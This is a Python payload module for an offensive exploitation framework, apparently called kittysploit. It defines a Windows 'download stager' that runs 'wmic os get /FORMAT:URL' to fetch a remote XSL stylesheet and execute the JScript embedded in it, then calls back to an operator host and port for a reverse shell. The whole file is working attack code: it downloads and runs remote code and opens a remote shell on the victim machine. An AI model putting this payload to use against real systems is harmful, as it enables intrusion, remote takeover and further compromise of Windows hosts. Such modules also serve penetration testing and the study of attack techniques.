#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_wmic_xsl, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Windows Download Stager, wmic XSL",
        "description": (
            "wmic os get /FORMAT:URL — executes JScript embedded in a remote XSL. "
            "Host a malicious stylesheet at stager_url (stager.xsl)."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Operator host", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted .xsl", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.xsl")
            print_info(f"stager_url not set — using {url}")
        return build_wmic_xsl(url)
